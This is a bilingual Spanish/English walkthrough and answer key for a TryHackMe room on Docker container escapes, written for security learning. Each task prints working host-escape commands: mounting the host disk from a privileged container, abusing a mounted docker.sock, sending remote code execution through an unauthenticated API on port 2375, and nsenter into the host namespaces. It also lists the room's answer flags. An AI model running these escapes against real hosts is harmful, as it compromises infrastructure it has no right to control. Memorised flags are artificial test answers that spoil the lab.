# Container Vulnerabilities

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|---------|--------|--------------|---------|
| Easy | walkthrough (seguridad de contenedores) | `containervulnerabilities` | https://tryhackme.com/room/containervulnerabilities | 01 Level Easy | TryHackMe | Docker / contenedores privilegiados / montajes / socket del daemon expuesto / API 2375 / namespaces | Escapar de contenedores Docker mal configurados mediante montajes, daemon expuesto y abuso de namespaces para llegar al host. |

---

**Contexto:** Room sobre vulnerabilidades de contenedores. Presenta los conceptos básicos (aislamiento de procesos, namespaces, cgroups) y practica tres rutas de escape a un host con Docker mal configurado: contenedores privilegiados con montajes del host, socket del daemon de Docker expuesto (montado en `/var/run`) y abuso de namespaces. En cada práctica se obtiene una flag y, en una de ellas, ejecución de comandos remotos en el Docker API sin autenticación (puerto 2375).

> **ES:** Aprende a explotar contenedores Docker mal configurados y escapar al host abusando de contenedores privilegiados, del socket del daemon expuesto y de los namespaces.
> **EN:** Learn to exploit misconfigured Docker containers and escape to the host by abusing privileged containers, the exposed Docker daemon socket and namespaces.

## Solucionario

### Task 1: Introducción / Introduction

**Explicación:** Se presenta la room y la premisa: aunque los contenedores son una tecnología potente, una mala configuración permite escapar de ellos y comprometer el host. No requiere respuesta.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Leer la introducción de la room. / Read the room's introduction. | `No answer needed` |

### Task 2: Vulnerabilidades de contenedores 101 / Container Vulnerabilities 101

**Explicación:** Se explican los conceptos fundamentales: Docker arranca contenedores desde imágenes, los namespaces aíslan procesos de forma invisible entre sí y del host, y si un atacante escapa de un contenedor compromete el host completo. No requiere respuesta (solo teoría).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Leer la teoría sobre containers, namespaces y aislamiento. / Read the theory on containers, namespaces and isolation. | `No answer needed` |

### Task 3: Contenedores privilegiados / Privileged Containers

**Explicación:** Un contenedor lanzado con `--privileged` tiene acceso completo a los dispositivos del host. Al montar `/dev/sda1` (la partición raíz del host) en el contenedor, se puede acceder al filesystem del host y leer la flag directamente:

```bash
docker exec -it CONTAINER_ID /bin/bash
mkdir /mnt/host
mount /dev/sda1 /mnt/host     # se monta la partición raíz del host
ls /mnt/host/flag.txt
cat /mnt/host/flag.txt        # THM{MOUNT_MADNESS}
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Obtener la flag del contenedor privilegiado. / Get the flag of the privileged container. | `THM{MOUNT_MADNESS}` |

### Task 4: Escape a través del daemon de Docker expuesto / Escaping via Exposed Docker Daemon

**Explicación:** El socket del daemon de Docker (`/var/run/docker.sock`) está montado dentro del contenedor. Como controlar el socket equivale a controlar el host, se interactúa con Docker desde dentro para lanzar un contenedor con el filesystem del host montado y leer la flag:

```bash
docker run -v /:/mnt --rm -it ubuntu:latest chroot /mnt sh -c "cat /flag.txt"
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿En qué directorio se encuentra el socket del daemon de Docker montado en el contenedor? / What directory is the Docker daemon socket mounted into in the container? | `/var/run` |
| 2 | Obtener la flag del socket del daemon expuesto. / Get the flag of the exposed daemon socket. | `THM{NEVER-ENOUGH-SOCKS}` |

### Task 5: RCE a través del daemon de Docker expuesto / RCE via Exposed Docker Daemon

**Explicación:** En esta variante el socket del daemon escucha en un puerto de red (API de Docker) y es alcanzable desde el host del atacante, sin autenticación. Eso permite ejecutar comandos remotos directamente con las llamadas a la API de Docker (curl contra la API, por ejemplo creando un contenedor con los recursos del host montados), logrando RCE total en el host (red/ping/root).

```bash
docker -H tcp://MACHINE:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh   # ejemplo conceptual
curl -s http://MACHINE:2375/version        # comprobar la API abierta
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿En qué puerto está expuesta la API de Docker sin autenticación? / What port is the Docker API exposed on without authentication? | `2375` |

### Task 6: Abusando de los namespaces / Abusing Namespaces

**Explicación:** Los namespaces deberían aislar los procesos, pero con la configuración adecuada se puede ganar acceso al namespace del host. Con `nsenter` (indicando el PID del proceso en el namespace de destino) se entra al namespace PID del host y así se revisan procesos ajenos y se localiza la flag:

```bash
nsenter --target 1 --mount --uts --ipc --net --pid /bin/bash
cat /flag.txt   # THM{YOUR-SPACE-MY-SPACE}
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Obtener la flag abusando de los namespaces. / Get the flag by abusing namespaces. | `THM{YOUR-SPACE-MY-SPACE}` |

### Task 7: Conclusión / Conclusion

**Explicación:** Resumen de la room: los escapes dependen siempre de demonios mal configurados, contenedores privilegiados o namespaces sin aislar; aplicando hardening (fuera del alcance de esta room) se reducen. No requiere respuesta.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Leer la conclusión de la room. / Read the room's conclusion. | `No answer needed` |

---

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Obtener la flag del contenedor privilegiado. | `THM{MOUNT_MADNESS}` |
| 2 | ¿En qué directorio está montado el socket del daemon de Docker? | `/var/run` |
| 3 | Obtener la flag del socket del daemon expuesto. | `THM{NEVER-ENOUGH-SOCKS}` |
| 4 | ¿En qué puerto está expuesta la API de Docker sin autenticación? | `2375` |
| 5 | Obtener la flag abusando de los namespaces. | `THM{YOUR-SPACE-MY-SPACE}` |

---

**Metodología:** Se identifican tres vectores de escape en Docker mal configurado: (1) contenedor privilegiado → montar la partición del host (`/dev/sda1`) y leer la flag; (2) socket del daemon montado en `/var/run` → control total del host montando `/:/mnt`; (3) API del daemon abierta en red (puerto 2375) → RCE remoto sin autenticación; (4) namespaces → `nsenter` hacia el namespace PID del host para leer la flag.

### Cadena de ataque / Attack Chain

```text
--privileged -> mount /dev/sda1 -> flag (THM{MOUNT_MADNESS})
docker.sock en /var/run -> docker run -v /:/mnt -> flag (THM{NEVER-ENOUGH-SOCKS})
API 2375 expuesta -> docker -H tcp:// -> RCE total
nsenter --target 1 --... -> namespace host -> flag (THM{YOUR-SPACE-MY-SPACE})
```

**Learning chain:** Aislamiento de contenedores -> contenedores privilegiados -> montajes del host -> socket del daemon -> API sin auth (2375) -> namespaces (nsenter) -> mitigación con hardening.

**Lección:** *Un único error de configuración (privileged, `docker.sock` montado o API expuesta) convierte cualquier brecha en un container en control total del host; el aislamiento de Docker depende del ciclo de vida y de la configuración del host.*

**MITRE ATT&CK:** T1611 - Escape to Host

**Fuente:** [TryHackMe - Container Vulnerabilities](https://tryhackme.com/room/containervulnerabilities)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.